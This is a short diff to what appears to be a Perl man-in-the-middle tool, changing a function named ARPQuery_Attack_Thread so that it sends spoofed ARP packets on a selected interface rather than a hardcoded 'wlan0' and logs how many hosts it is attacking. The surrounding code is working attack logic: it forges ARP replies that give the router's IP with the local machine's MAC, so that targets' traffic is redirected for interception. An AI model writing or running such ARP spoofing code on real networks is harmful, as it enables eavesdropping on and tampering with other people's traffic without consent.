@@ -12,11 +12,13 @@ sub ARPQuery_Attack_Thread{
 	my %targets = GetAttackTargets();
 	my $localmac = GetLocalMac();
 	my $router = GetAttackRouter();
+	my $count = scalar(keys %targets);
+	my $interface = GetSelectedInterface();
+	AddLogInfo("[SITM] ARP Query Attack started on $count hosts !");
 	while ($arpquery_attackstatut) {
 
 		foreach my $k (keys(%targets)) {
-		    print STDERR "ARP SPOOFING SIP=$k SMAC=$targets{$k} USING IP : $router\n";
-		    Net::ARP::send_packet('wlan0',                 # Device
+		    Net::ARP::send_packet($interface,                 # Device
 	            $router,          # Source IP
 	            $k,          # Destination IP
 	            $localmac,  # Source MAC
